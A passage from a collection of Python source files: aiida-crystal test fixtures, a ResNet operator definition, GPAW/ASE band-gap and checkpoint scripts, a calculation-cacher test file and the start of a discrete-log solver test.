node.add_incoming(crystal_calc.inputs.basis_family, link_type=LinkType.INPUT_CALC, link_label='basis_family')\n        node.store()\n        retrieved = calc_results(files, prefix)\n        retrieved.add_incoming(node, link_type=LinkType.CREATE, link_label='retrieved')\n        retrieved.store()\n        return node\n\n    return get_calcnode\n\n\n@pytest.fixture\ndef properties_calc(test_properties_code, properties_calc_parameters, test_wavefunction):\n    from aiida.common.extendeddicts import AttributeDict\n    from aiida_crystal_dft.calculations.properties import PropertiesCalculation\n    inputs = AttributeDict()\n    inputs.metadata = AttributeDict({'options':\n                                     {'resources':\n                                      {\"num_machines\": 1, \"num_mpiprocs_per_machine\": 1}\n                                      }\n                                     })\n    inputs.code = test_properties_code\n    inputs.parameters = properties_calc_parameters\n    inputs.wavefunction = test_wavefunction\n    calc = PropertiesCalculation(inputs)\n    return calc\n\n\n@pytest.fixture\ndef properties_calc_node(properties_calc, calc_results):\n    \"\"\"Returns CalcJobNode corresponding to PropertiesCalc CalcJob\"\"\"\n    from aiida.orm import CalcJobNode\n    from aiida.common.links import LinkType\n    computer = properties_calc.inputs.code.get_remote_computer()\n    process_type = 'aiida.calculations:{}'.format('crystal_dft.properties')\n\n    def get_calcnode(files=None):\n        node = CalcJobNode(computer=computer, process_type=process_type)\n        node.set_process_label('PropertiesCalculation')\n        node.set_option('resources', {'num_machines': 1, 'num_mpiprocs_per_machine': 1})\n        node.set_attribute('input_filename', 'INPUT')\n        node.set_attribute('output_filename', '_scheduler-stderr.txt')\n        node.set_attribute('error_filename', '_scheduler-stderr.txt')\n        node.add_incoming(properties_calc.inputs.code, link_type=LinkType.INPUT_CALC, link_label='code')\n        node.add_incoming(properties_calc.inputs.parameters, link_type=LinkType.INPUT_CALC, link_label='parameters')\n        node.add_incoming(properties_calc.inputs.wavefunction, link_type=LinkType.INPUT_CALC, link_label='wavefunction')\n        node.store()\n        retrieved = calc_results(files)\n        retrieved.add_incoming(node, link_type=LinkType.CREATE, link_label='retrieved')\n        retrieved.store()\n        return node\n\n    return get_calcnode\n\n\n@pytest.fixture\ndef crystal_calc_parameters():\n    from aiida.orm import Dict\n    return Dict(dict={\n        \"title\": \"Crystal calc\",\n        \"scf\": {\n            \"k_points\": (8, 8),\n            # 'dft': {'xc': 'PBE0'}\n        }\n    })\n\n\n@pytest.fixture\ndef properties_calc_parameters():\n    from aiida.orm import Dict\n    return Dict(dict={\n        \"band\": {\n            \"shrink\": 8,\n            \"k_points\": 30,\n            \"first\": 1,\n            \"last\": 14,\n            \"bands\": [[[0, 0, 0], [4, 0, 4]],\n                      [[4, 0, 4], [5, 2, 5]],\n                      [[3, 3, 6], [0, 0, 0]],\n                      [[0, 0, 0], [4, 4, 4]],\n                      [[4, 4, 4], [4, 2, 6]],\n                      [[4, 2, 6], [4, 0, 4]]]\n        }\n    })\n\n\n@pytest.fixture\ndef test_wavefunction():\n    from aiida.orm import SinglefileData\n    from aiida_crystal_dft.tests import TEST_DIR\n    file_name = os.path.join(TEST_DIR,\n                             'output_files',\n                             'mgo_sto3g',\n                             'fort.9')\n    temp_dir = tempfile.gettempdir()\n    expected = os.path.join(temp_dir, \"fort.9\")\n    shutil.copy(file_name, expected)\n    with open(expected, 'rb') as f:\n        yield SinglefileData(file=f)\n    os.remove(expected)\n\n\n@pytest.fixture\ndef test_ase_structure():\n    # LiCl\n    # return crystal(\n    #     symbols=['Cl', 'Li'],\n    #     basis=[[0.3333333333, 0.6666666667, 0.379], [0.3333333333, 0.6666666667, 0.0]],\n    #     spacegroup=186,\n    #     cellpar=[3.852, 3.852, 6.118, 90.0, 90.0, 120.0])\n    # MgO\n    return crystal(\n        symbols=[12, 8],\n        # symbols=[26, 8],\n        basis=[[0, 0, 0], [0.5, 0.5, 0.5]],\n        spacegroup=225,\n        cellpar=[4.21, 4.21, 4.21, 90, 90, 90])\n\n\n@pytest.fixture\ndef test_mpds_structure(aiida_profile):\n    from aiida.tools.dbimporters.plugins.mpds import MpdsDbImporter\n    from aiida.orm import StructureData\n    importer = MpdsDbImporter()\n    query = {'formulae': 'HgEr', 'sgs': 221}\n    res = next(importer.find(query))\n    ase_struct = crystal(\n        symbols=res['els_noneq'],\n        basis=res['basis_noneq'],\n        spacegroup=res['sg_n'],\n        cellpar=res['cell_abc'])\n    return StructureData(ase=ase_struct)\n\n\n@pytest.fixture\ndef test_magnetic_structure(aiida_profile):\n    from aiida.orm import StructureData\n    ase_struct = crystal(\n        symbols=[26, 8],\n        basis=[[0, 0, 0], [0.5, 0.5, 0.5]],\n        spacegroup=225,\n        cellpar=[4.21, 4.21, 4.21, 90, 90, 90])\n    return StructureData(ase=ase_struct)\n\n\n@pytest.fixture\ndef test_structure_data(aiida_profile, test_ase_structure):\n    from aiida.orm import StructureData\n    return StructureData(ase=test_ase_structure)\n\n\n@pytest.fixture\ndef test_structure_issue_30(aiida_profile):\n    from .. import TEST_DIR\n    # from aiida_crystal_dft.io.f9 import Fort9\n    from aiida_crystal_dft.io.f34 import Fort34\n    name = os.path.join(TEST_DIR,\n                        \"input_files\",\n                        \"issue_30\",\n                        \"fort.34\")\n    # parser = Fort9(name)\n    struct = Fort34().read(name)\n    print(struct.space_group)\n    return struct.to_aiida()\n", "568": "# Copyright 2020 Jiang Shenghu\n# SPDX-License-Identifier: Apache-2.0\nfrom .utils import *\nfrom ..op import CombinedOp, SequenceOp, ElementwiseAdd, Linear, ReLU\n\n\nclass BasicBlock(CombinedOp):\n    expansion = 1\n\n    def __init__(self, name, in_shape, out_channel, stride=1, downsample=None):\n        in_shape = shape2d(in_shape)\n        self.conv1 = conv(name + '.conv1', in_shape, out_channel, 3, stride, 1)\n        self.relu1 = mock(ReLU, name + '.relu1', self.conv1)\n        self.conv2 = conv(name + '.conv2', self.conv1, out_channel, 3, 1, 1)\n        self.relu2 = mock(ReLU, name + '.relu2', self.conv2)\n        self.eltwise_add = mock(ElementwiseAdd, name + '.eltwise_add', self.conv2)\n        self.batch = self.relu2.batch\n        self.out_channel = self.relu2.channel\n        self.out_height = self.relu2.height\n        self.out_width = self.relu2.width\n        self.downsample = downsample\n        self.stride = stride\n        ops = [v for v in self.__dict__.values() if isinstance(v, BaseOp)]\n        super().__init__(name=name, ops=ops)\n\n    def calc(self, x):\n        residual = x\n        out = self.conv1.calc(x)\n        out = self.relu1.calc(out)\n        out = self.conv2.calc(out)\n        if self.downsample is not None:\n            residual = self.downsample.calc(x)\n        out = self.eltwise_add.calc(out, residual)\n        out = self.relu2.calc(out)\n        return out\n\n\nclass Bottleneck(CombinedOp):\n    expansion = 4\n\n    def __init__(self, name, in_shape, out_channel, stride=1, downsample=None):\n        self.conv1 = conv(name + '.conv1', in_shape, out_channel, 1)\n        self.relu1 = mock(ReLU, name + '.relu1', self.conv1)\n        self.conv2 = conv(name + '.conv2', self.conv1, out_channel, 3, stride, 1)\n        self.relu2 = mock(ReLU, name + '.relu2', self.conv2)\n        self.conv3 = conv(name + '.conv3', self.conv2, out_channel * 4, 1)\n        self.relu3 = mock(ReLU, name + '.relu3', self.conv3)\n        self.eltwise_add = mock(ElementwiseAdd, name + '.eltwise_add', self.conv3)\n        self.batch = self.relu3.batch\n        self.out_channel = self.relu3.channel\n        self.out_height = self.relu3.height\n        self.out_width = self.relu3.width\n        self.downsample = downsample\n        self.stride = stride\n        ops = [v for v in self.__dict__.values() if isinstance(v, BaseOp)]\n        super().__init__(name=name, ops=ops)\n\n    def calc(self, x):\n        residual = x\n        out = self.conv1.calc(x)\n        out = self.relu1.calc(out)\n        out = self.conv2.calc(out)\n        out = self.relu2.calc(out)\n        out = self.conv3.calc(out)\n        if self.downsample is not None:\n            residual = self.downsample(x)\n        out = self.eltwise_add.calc(out, residual)\n        out = self.relu3.calc(out)\n        return out\n\n\nclass ResNet(CombinedOp):\n    def __init__(self, name, in_shape, block, layers, num_classes=1000, deep_stem=False, avg_down=False):\n        self.inplanes = 64\n        self.deep_stem = deep_stem\n        self.avg_down = avg_down\n        if self.deep_stem:\n            conv1 = conv(name + '.stem.conv1', in_shape, 32, 3, 2, 1)\n            relu1 = mock(ReLU, name + '.stem.relu1', conv1)\n            conv2 = conv(name + '.stem.conv2', conv1, 32, 3, 1, 1)\n            relu2 = mock(ReLU, name + '.stem.relu2', conv2)\n            conv3 = conv(name + '.stem.conv3', conv2, 64, 3, 1, 1)\n            self.conv1 = SequenceOp(name='.stem', ops=[conv1, relu1, conv2, relu2, conv3])\n        else:\n            self.conv1 = conv(name + '.conv1', in_shape, 64, 7, 2, 3)\n        self.relu1 = mock(ReLU, name + '.relu1', self.conv1)\n        self.maxpool = pool(name + '.maxpool', self.relu1, 3, 2, 1, 'max')\n        self.layer1 = self._make_layer(name + '.layer1', self.maxpool, block, 64, layers[0])\n        self.layer2 = self._make_layer(name + '.layer2', self.layer1, block, 128, layers[1], stride=2)\n        self.layer3 = self._make_layer(name + '.layer3', self.layer2, block, 256, layers[2], stride=2)\n        self.layer4 = self._make_layer(name + '.layer4', self.layer3, block, 512, layers[3], stride=2)\n        self.avgpool = pool(name + '.avgpool', self.layer4, 7, 1, 0, 'avg')\n        self.flatten = flatten2d(name + '.flatten', self.avgpool)\n        self.fc = Linear(\n            batch=self.flatten.batch, in_channel=512 * block.expansion,\n            out_channel=num_classes, biased=True,\n            name=name + '.linear'\n        )\n        ops = [v for v in self.__dict__.values() if isinstance(v, BaseOp)]\n        super().__init__(name=name, ops=ops)\n\n    def _make_layer(self, name, prev, block, planes, blocks, stride=1, avg_down=False):\n        downsample = None\n        if stride != 1 or self.inplanes != planes * block.expansion:\n            if self.avg_down:\n                raise NotImplemented\n                # downsample = nn.Sequential(\n                #     nn.AvgPool2d(stride, stride=stride, ceil_mode=True, count_include_pad=False),\n                #     nn.Conv2d(self.inplanes, planes * block.expansion,\n                #               kernel_size=1, stride=1, bias=False),\n                #     BN(planes * block.expansion),\n                # )\n            else:\n                downsample = conv(name + '.downsample', prev, planes * block.expansion, 1, stride)\n\n        layers = []\n        layers.append(block(name + '.' + str(len(layers)), prev, planes, stride, downsample))\n        self.inplanes = planes * block.expansion\n        for i in range(1, blocks):\n            layers.append(block(name + '.' + str(len(layers)), layers[-1], planes))\n\n        return SequenceOp(name=name, ops=layers)\n\n    def calc(self, x):\n        x = self.conv1.calc(x)\n        x = self.relu1.calc(x)\n        x = self.maxpool.calc(x)\n        x = self.layer1.calc(x)\n        x = self.layer2.calc(x)\n        x = self.layer3.calc(x)\n        x = self.layer4.calc(x)\n        x = self.avgpool.calc(x)\n        x = self.flatten.calc(x)\n        x = self.fc.calc(x)\n        return x\n\n\ndef resnet18(**kwargs):\n    model = ResNet('resnet18', [1, 3, 224, 224], BasicBlock, [2, 2, 2, 2], **kwargs)\n    return model\n", "569": "from pathlib import Path\nfrom ase.db import connect\nfrom ase.constraints import ExpCellFilter\nfrom ase.optimize import BFGS\nfrom ase.build import bulk\nfrom ase.dft.bandgap import bandgap\nfrom gpaw import GPAW, PW\n\n\nif Path('database.db').is_file():\n    Path('database.db').unlink()\n\nstructures = ['Si', 'Ge', 'C']\ndb = connect('database.db')\n\nfor f in structures:\n    db.write(bulk(f))\n\nfor row in db.select():\n    atoms = row.toatoms()\n    calc = GPAW(mode=PW(400),\n                kpts=(4, 4, 4),\n                txt=f'{row.formula}-gpaw.txt', xc='LDA')\n    atoms.calc = calc\n    atoms.get_stress()\n    filter = ExpCellFilter(atoms)\n    opt = BFGS(filter)\n    opt.run(fmax=0.05)\n    db.write(atoms=atoms, relaxed=True)\n\n\nfor row in db.select(relaxed=True):\n    atoms = row.toatoms()\n    calc = GPAW(mode=PW(400),\n                kpts=(4, 4, 4),\n                txt=f'{row.formula}-gpaw.txt', xc='LDA')\n    atoms.calc = calc\n    atoms.get_potential_energy()\n    bg, _, _ = bandgap(calc=atoms.calc)\n    db.update(row.id, bandgap=bg)\n", "570": "import numpy as np\n\nfrom ase import Atom\nfrom ase.build import bulk\nfrom ase.calculators.checkpoint import Checkpoint, CheckpointCalculator\nfrom ase.calculators.lj import LennardJones\nfrom ase.lattice.cubic import Diamond\n\n\ndef op1(a, m):\n    a[1].position += m * np.array([0.1, 0.2, 0.3])\n    return a\n\n\ndef op2(a, m):\n    a += Atom('C', m * np.array([0.2, 0.3, 0.1]))\n    return a, a.positions[0]\n\n\ndef test_sqlite(testdir):\n    CP = Checkpoint('checkpoints.db')\n    a = Diamond('Si', size=[2, 2, 2])\n    a = CP(op1)(a, 1.0)\n    op1a = a.copy()\n    a, ra = CP(op2)(a, 2.0)\n    op2a = a.copy()\n    op2ra = ra.copy()\n\n    CP = Checkpoint('checkpoints.db')\n    a = Diamond('Si', size=[2, 2, 2])\n    a = CP(op1)(a, 1.0)\n    assert a == op1a\n    a, ra = CP(op2)(a, 2.0)\n    assert a == op2a\n    assert(np.abs(ra - op2ra).max() < 1e-5)\n\n\ndef rattle_calc(atoms, calc):\n    orig_atoms = atoms.copy()\n\n    # first do a couple of calculations\n    np.random.seed(0)\n    atoms.rattle()\n    cp_calc_1 = CheckpointCalculator(calc)\n    atoms.calc = cp_calc_1\n    e11 = atoms.get_potential_energy()\n    f11 = atoms.get_forces()\n    atoms.rattle()\n    e12 = atoms.get_potential_energy()\n    f12 = atoms.get_forces()\n\n    # then re-read them from checkpoint file\n    atoms = orig_atoms\n    np.random.seed(0)\n    atoms.rattle()\n    cp_calc_2 = CheckpointCalculator(calc)\n    atoms.calc = cp_calc_2\n    e21 = atoms.get_potential_energy()\n    f21 = atoms.get_forces()\n    atoms.rattle()\n    e22 = atoms.get_potential_energy()\n    f22 = atoms.get_forces()\n\n    assert e11 == e21\n    assert e12 == e22\n    assert(np.abs(f11 - f21).max() < 1e-5)\n    assert(np.abs(f12 - f22).max() < 1e-5)\n\n\ndef test_new_style_interface(testdir):\n    calc = LennardJones()\n    atoms = bulk('Cu')\n    rattle_calc(atoms, calc)\n", "571": "#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nfrom modules import *\nfrom modules_mega_23.calculation_cacher import *\n\n\ndef test_cacher_calculate_mockup():\n    calc_cacher = make_calculateCacher()\n    to_mockup = {\n        \"mockup\": True,\n        \"mockuped\": 123,\n    }\n    result = calc_cacher.calculate(to_mockup=to_mockup)\n    assert result == 123\n\n\ndef test_cacher_save_mode_json():\n    calc_cacher = make_calculateCacher()\n\n    start_from = 25\n    to_calculate = {\n        \"func\": demo_return_num,\n        \"kwargs\": dict(num=start_from),\n    }\n\n    # \u0446\u0435\u043b\u044c - \u0441\u043e\u0445\u0440\u0430\u043d\u0438\u0442\u044c \u0432\u043c\u0435\u0441\u0442\u043e pickle json\n    f_saved = \"in_json\"\n    f_real = calc_cacher.get_f(f_saved)\n    rmfile(f_real)\n\n    assert file_exists(f_real) == False\n\n    _kwargs = {\n        \"to_calculate\": to_calculate,\n        \"save_mode\": \"json\",\n        \"f_to\": f_saved,\n    }\n    result = calc_cacher.calculate(**_kwargs)\n    assert result == start_from\n    assert file_exists(f_real) == True\n\n\ndef test_resave_file():\n    calc_cacher = make_calculateCacher()\n    f = r\"s:\\python2.7\\Lib\\site-packages\\modules_projects\\data\\parse_elements.js\"\n    f_saved = calc_cacher.resave_file(f)\n    assert file_exists(f_saved) == True\n\n\ndef test_resave_to_file():\n    calc_cacher = make_calculateCacher()\n    html = \"\u043f\u0440\u0438\u0432\u0435\u0442! \u0421\u043e\u0445\u0440\u0430\u043d\u0438 \u043c\u0435\u043d\u044f \u043f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430\"\n    f = \"asdfadfadf/some_special_name_of_file.json\"\n\n    f_saved = calc_cacher.resave_text_to_file(html, f)\n    assert file_exists(f_saved) == True\n\n\ndef test_scenario_calcCacher_releaseVersion_and_debug():\n    start_from = 25\n    to_calculate = {\n        \"func\": demo_return_num,\n        \"kwargs\": dict(num=start_from),\n    }\n\n    # \u043d\u0430 \u0441\u0435\u0440\u0432\u0435\u0440\u0435 - \u0432\u0441\u0435 \u0441\u043e\u0445\u0440\u0430\u043d\u044f\u0435\u043c, \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u043a\u0435\u0448\u0438\u0440\u0443\u0435\u043c\n    d_to = r\"s:\\python2.7\\Lib\\site-packages\\modules_projects\\temp\\!cache_calculate_with_cacher\\!typical_bet\"\n    _kwargs = {\n        \"want_cache\": False,\n        \"want_save_all\": True,\n        \"d_to\": d_to,\n    }\n    calc_cacher = make_calculateCacher(**_kwargs)\n\n    result = calc_cacher.calculate(to_calculate)\n    logger.debug(\"result=%s\" % result)\n    assert result == start_from\n    assert calc_cacher._stats == {\"calculated\": 1}\n\n    # \u0430 \u0442\u0435\u043f\u0435\u0440\u044c \u0442\u0438\u043f\u0430 \u0434\u0435\u0431\u0430\u0433 - \u044f \u0445\u043e\u0447\u0443 \u043f\u043e\u0434\u0442\u044f\u043d\u0443\u0442\u044c \u0438\u043d\u0444\u0443\n    _kwargs = {\n        \"want_cache\": True,\n        \"want_save_all\": False,\n        \"d_to\": d_to,\n    }\n    calc_cacher = make_calculateCacher(**_kwargs)\n\n    result = calc_cacher.calculate(to_calculate)\n    logger.debug(\"result=%s\" % result)\n    assert result == start_from\n    assert calc_cacher._stats == {\"cache_file\": 1}\n\n\ndef test_demo_multifunc(calc_cacher=None):\n    calc_cacher = make_calculateCacher(calc_cacher=calc_cacher)\n\n    start_from = 25\n    adding = 10\n    res1, res2 = demo_multifunc(\n        calc_cacher=calc_cacher, start_from=start_from, adding=adding\n    )\n\n    assert res1 == start_from\n    assert res2 == start_from + adding\n\n\ndef test_check_want_cache(calc_cacher=None):\n    \"\"\"\n    \u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e \u043e\u043f\u0440\u0435\u0434\u0435\u043b\u044f\u0435\u043c \u0445\u043e\u0442\u0438\u043c \u043a\u0435\u0448 \u0438\u043b\u0438 \u043d\u0435\u0442?\n    \"\"\"\n    fun = \"test_check_want_cache\"\n    calc_cacher = make_calculateCacher(calc_cacher=calc_cacher)\n\n    num = 25\n    func, args, kwargs = demo_return_num, (num,), {}\n    to_calculate = func_args_kwargs_to_dict(func, args, kwargs)\n\n    _kwargs = {\n        \"to_calculate\": to_calculate,\n        \"cache_name\": \"to_calculate_step_2\",\n    }\n\n    t = 0\n    t = 1\n    if t:\n        want_cache, cache_logic = calc_cacher.check_want_cache(**_kwargs)\n        logger.debug(\n            \"want_cache %s, cache_login %s\" % (want_cache, cache_logic)\n        )\n        assert want_cache == True\n        assert cache_logic == \"main want_cache\"\n\n    # test 2\n    t = 1\n    if t:\n        calc_cacher.demo_return_num = True\n        want_cache, cache_logic = calc_cacher.check_want_cache(**_kwargs)\n        logger.debug(\n            \"want_cache %s, cache_login %s\" % (want_cache, cache_logic)\n        )\n        assert want_cache == True\n        assert cache_logic == \"func_name\"\n\n    # test 3\n    t = 1\n    if t:\n        calc_cacher.to_calculate_step_2 = True\n        want_cache, cache_logic = calc_cacher.check_want_cache(**_kwargs)\n        logger.debug(\n            \"want_cache %s, cache_login %s\" % (want_cache, cache_logic)\n        )\n        assert want_cache == True\n        assert cache_logic == \"cache_name\"\n\n    # test 4\n    t = 1\n    if t:\n        _kwargs[\"want_cache\"] = False\n        calc_cacher.to_calculate_step_2 = True\n        want_cache, cache_logic = calc_cacher.check_want_cache(**_kwargs)\n        logger.debug(\n            \"want_cache %s, cache_login %s\" % (want_cache, cache_logic)\n        )\n        assert want_cache == False\n        assert cache_logic == \"in_kwargs\"\n\n\ndef test_cacher_return_saved_with_func():\n    num = 25\n    func, args, kwargs = demo_return_num, (num,), {}\n    to_calculate = func_args_kwargs_to_dict(func, args, kwargs)\n\n    func, args, kwargs = demo_return_num_25, (), {}\n    to_load = func_args_kwargs_to_dict(func, args, kwargs)\n\n    calculated = calculate_with_cacher(\n        to_calculate, to_load=to_load, f_to=\"nah\"\n    )\n\n    assert calculated == num\n\n\ndef test_cacher_return_saved_in_file():\n    num = 26\n    func, args, kwargs = demo_return_num, (num,), {}\n    to_calculate = func_args_kwargs_to_dict(func, args, kwargs)\n\n    calculated = calculate_with_cacher(to_calculate, want_cache=True)\n\n    assert calculated == num\n    assert calculated != 1.11\n\n\ndef test_cacher_calculated():\n    to_calculate = get_demo_return_args()\n    func, args, kwargs = parse_func_args_kwargs(to_calculate)\n\n    calculated = calculate_with_cacher(to_calculate, want_cache=False)\n\n    # logger.debug('calculated %s' % calculated)\n    assert calculated == (args, kwargs)\n    assert calculated != \"some error\"\n\n\ndef get_demo_return_num(num):\n    func = demo_return_num\n    args = ((num),)\n    kwargs = {}\n    r = func_args_kwargs_to_dict(func, args, kwargs)\n    logger.debug(\"%s\" % r)\n    return r\n\n\ndef get_demo_return_args():\n    func = demo_return_args\n    args = (1, 2)\n    kwargs = {\"x\": 1, \"y\": 2}\n    return func_args_kwargs_to_dict(func, args, kwargs)\n\n\ndef demo_return_args(*args, **kwargs):\n    return args, kwargs\n\n\ndef demo_return_num(num=1):\n    return num\n\n\ndef demo_return_num_25():\n    return 25\n\n\ndef demo_add(num, num_2=2):\n    return num + num_2\n\n\ndef demo_multifunc(calc_cacher=None, start_from=25, adding=10):\n    \"\"\"\n    \u0444-\u044f \u0438\u0437 2-\u0445 \u0448\u0430\u0433\u043e\u0432:\n    \"\"\"\n    if calc_cacher is None:\n        calc_cacher = make_calculateCacher()\n    func_calculate = calc_cacher.calculate\n\n    # func1\n    to_calculate = {\n        \"func\": demo_return_num,\n        \"kwargs\": dict(num=start_from),\n    }\n    res1 = func_calculate(to_calculate)\n    # logger.debug('%s %s' % (res, expected))\n\n    # func2\n    to_calculate = {\n        \"func\": demo_add,\n        # 'args': (res1, adding,),\n        \"kwargs\": dict(num=res1, num_2=adding),\n    }\n    want_cache = False\n    res2 = func_calculate(to_calculate, want_cache=want_cache)\n    # 25 + 10 == 35\n\n    return (res1, res2)\n\n\ndef make_calculateCacher(calc_cacher=None, *args, **kwargs):\n    if calc_cacher:\n        return calc_cacher\n\n    d_to = kwargs.get(\"d_to\")\n    if not d_to:\n        d_to = r\"s:\\python2.7\\Lib\\site-packages\\modules_projects\\temp\\!cache_calculate_with_cacher\\!from_tester\"\n\n    d = {\n        \"want_cache\": True,\n        \"d_to\": d_to,\n    }\n    kwargs = add_defaults(kwargs, d)\n\n    calc_cacher = CalculateCacher(*args, **kwargs)\n    return calc_cacher\n\n\nif __name__ == \"__main__\":\n    special = \"test_check_want_cache\"\n    special = \"demo_multifunc\"\n    special = \"test_scenario_calcCacher_releaseVersion_and_debug\"\n    special = \"test_resave_to_file\"\n    special = \"test_cacher_save_mode_json\"\n    special = \"test_cacher_calculate_mockup\"\n\n    _ = {\n        \"want_cache\": False,\n        \"want_cache\": True,\n    }\n    calc_cacher = make_calculateCacher(**_)\n    logger.debug(\"calc_cacher=%s\" % calc_cacher)\n\n    if special == \"demo_multifunc\":\n        r = demo_multifunc(calc_cacher)\n        logger.debug(\"%s\" % r)\n\n    elif special == \"test_cacher_save_mode_json\":\n        test_cacher_save_mode_json()\n\n    elif special == \"test_resave_to_file\":\n        r = test_resave_to_file()\n        r = test_resave_file()\n        logger.debug(\"%s\" % r)\n\n    elif special == \"test_scenario_calcCacher_releaseVersion_and_debug\":\n        test_scenario_calcCacher_releaseVersion_and_debug()\n\n    elif special == \"test_check_want_cache\":\n        r = test_check_want_cache()\n\n    elif special == \"test_cacher_calculate_mockup\":\n        special = test_cacher_calculate_mockup()\n\n    else:\n        wait_for_ok(\"unknown special=%s\" % special)\n\n    logger.debug(\"final: %s\" % calc_cacher)\n    # \u0441\u043a\u043e\u043b\u044c\u043a\u043e \u0432\u0440\u0435\u043c\u0435\u043d\u0438 \u0443\u0448\u043b\u043e \u043d\u0430 \u0432\u0441\u0435 \u043f\u0440\u043e \u0432\u0441\u0435?\n    calc_cacher.print_log()\n", "572": "#Copyright Nick Prowse 2019. Code Licenced under GNU GPL v3.\n#Version 9. 19/09/2019.\n#Programmed & tested in Python 3.XX only\n#This program tests the algorithm in prop234_py3.py - solving multiple Discrete Log Problems (DLPs) specified by user in ranges, via Proposition 2.34 (in J Hoffstein, J Pipher & J Silverman) using order of g mod p, where p is a prime number.\n#Prime list file should be a .CSV file with each prime separated by commas.\n#Ensure that \"prime_list_path\" and \"prime_list_filename\" are edited for the location of prime list file used.\n#The larger the prime file is that is used, the longer the factorisations will take!\n#It has been tested on Linux Mint v4.XX x64 using a prime list with primes upto 99,997 and was able to solve a DLP with a prime of xxx in xxx seconds.\n\nimport sys\nimport math\ntry:\n\tfrom math import gcd as bltin_gcd\nexcept ImportError:\n\tfrom fractions import gcd\nimport os\nimport itertools\nimport csv\nimport time\n\nprint(\"Copyright Nick Prowse 2019. Code Licenced under GNU GPL v3.\")\nprint(\"Version 9. 19/09/2019.\")\nprint(\"Programmed & tested in python 3.XX only.\")\nprint(\"---------------------------------------------------------------------\")\nprint(\"This program tests the algorithm in prop234.py - solving multiple Discrete Log Problems (DLPs) specified by user in ranges, via Proposition 2.34 (in J Hoffstein, J Pipher & J Silverman) using order of g mod p, where p is a prime number.\")\n#print(\"Results printed are three arrays ...\"\nprint(\"Prime list file should be a .CSV file with each prime separated by commas.\")\nprint(\"Ensure that \\\"prime_list_path\\\" and \\\"prime_list_filename\\\" are edited for the location of prime list file used.\")\nprint(\"The larger the prime file is that is used, the longer the factorisation will take!\")\nprint(\"It has been tested on Linux Mint v4.XX x64 using a prime list with primes upto 99,997 and was able to solve a DLP with a prime of xxx in xxx seconds\")\nprint(\"---------------------------------------------------------------------\")\n\t\ndef main():\n\tprime_list_path=\"/home/mint/Desktop/\"\n\tprime_list_filename=\"primes_upto_100000.csv\"\n\tprimefile=prime_list_path + prime_list_filename\n\tprint(\"primefile currently is: \"+str(primefile))\n\n\t#define prime list\n\t#print('Importing primes from csv file')\n\tprimes = csvfile_store_primes(primefile)\n\t#print('First ten primes are: '+str(primes[0:10]))\n\n\t#print(sys.version_info)\n\n\t#initialise g_values, p_values, and h_values\n\t\n\t#g_values = range(2,3)\n\tg_values = range(2,20)\n\tp_values = primes[0:101]\n\t#p_values = primes[0:1001]\n\t#h_values = range(2,201)\n\n\ttotal_g_values=len(g_values)\n\tprint(\"total_g_values: \"+str(total_g_values))\n\n\ttotal_p_values=len(p_values)\n\tprint(\"total_p_values: \"+str(total_p_values))\n\n\t#total_h_values=len(h_values)\n\t#print(\"total_h_values: \"+str(total_h_values)\n\n\tTotal_values = total_g_values * total_p_values \n\tprint(\"Total_values: \"+str(Total_values))\n\t#Grand_total_values = total_p_values * total_g_values * total_h_values\n\t#print(\"Grand_total_values: \"+str(Grand_total_values)\n\n\t#define counts for different types of results\n\tcount_nosolns=0\n\tcount_x_equals_0=0\n\tcount_normal_soln=0\n\tcount_needlargerprimelist=0\n\tcount_q_e_found=0\n\tcount_q_e_not_found=0\t\n\tcount_notprime=0\n\tcount_calc_xi_no_solns=0\n\tcount_order_not_prime=0\n\tcount_order_prime=0\n\tcount_xi_not_found=0\n\tcount_calc_xi_status_false=0\n\t\n\t#define lists for different types of results\n\tanswers_to_be_checked=[]\n\t#order_false_list=[]\n\tn_prime=[]\n\tq_e_nf_order_p_list=[]\n\n\t#dlp is:  g**x congruent to h mod p, where g, h and p are known, p prime.\n\n\tprint(\"======================================\")\n\n\tprint('Looping through values for g, p, & h..')\n\n\tprevious_calc_g_p=[]\n\tprevious_calc_orders=[]\n\tfor g in g_values:\n\t\tprint(\"g is:\",str(g))\n\t\torder = 0\t\t\n\t\t#h_values_no_solution = False\n\t\tfor p in p_values:\n\t\t\tprint(\"p is:\",str(p))\n\t\t\t#print(\"====================================\"\t\n\t\t\t#print(\"p is: \"+str(p)\t\n\t\t\tif g % p == 0:\n\t\t\t\tcount_nosolns = count_nosolns + len(range(1,p+1))\n\n\t\t\tif g > p:\t\t\t\n\t\t\t\tg_old = g\t\t\t\t\n\t\t\t\tg_new = g % p\n\t\t\t\tprint(\"g:\",g_old,\"> p:\",p,\"- revised g_new is:\",g_new)\n\t\t\t\t\n\t\t\t\t# 2 < order <= p - 1\n\t\t\t\t#no_prim_roots = p - 1 #for F_p this is euler_phi(p) = p-1 since p is prime.\t\t\t\t\t\n\t\t\t\n\t\t\t\tresult = Calc_prop_234(g_new,p,count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p, previous_calc_orders, count_x_equals_0, count_normal_soln, count_needlargerprimelist, answers_to_be_checked, count_calc_xi_no_solns, count_notprime, count_xi_not_found, count_calc_xi_status_false)\n\n\t\t\t\t#return count_nosolns, count_calc_xi_no_solns, count_normal_soln, answers_to_be_checked, count_x_equals_0, count_needlargerprimelist, count_notprime, q_e_nf_order_p_list, count_xi_not_found, count_calc_xi_status_false, previous_calc_orders\n\n\t\t\t\t#x_final=result[0]\n\t\t\t\tcount_nosolns=result[0]\n\t\t\t\tcount_calc_xi_no_solns=result[1]\n\t\t\t\tcount_normal_soln=result[2]\n\t\t\t\t#x_moduli_final=result[4]\n\t\t\t\tanswers_to_be_checked=result[3]\n\t\t\t\tcount_x_equals_0=result[4]\n\t\t\t\tcount_needlargerprimelist=result[5]\n\t\t\t\tcount_notprime=result[6]\n\t\t\t\tq_e_nf_order_p_list=result[7]\n\t\t\t\tcount_xi_not_found=result[8]\n\t\t\t\tcount_calc_xi_status_false=result[9]\n\t\t\t\tprevious_calc_orders=result[10]\n\n\t\t\telif str(g)+\"_\"+str(p) not in previous_calc_g_p:\n\t\t\t\n\t\t\t\tresult = Calc_prop_234(g,p,count_nosolns, count_order_not_prime, count_q_e_found, count_q_e_not_found, q_e_nf_order_p_list, primes, n_prime, count_order_prime, previous_calc_g_p, previous_calc_orders, count_x_equals_0, count_normal_soln, 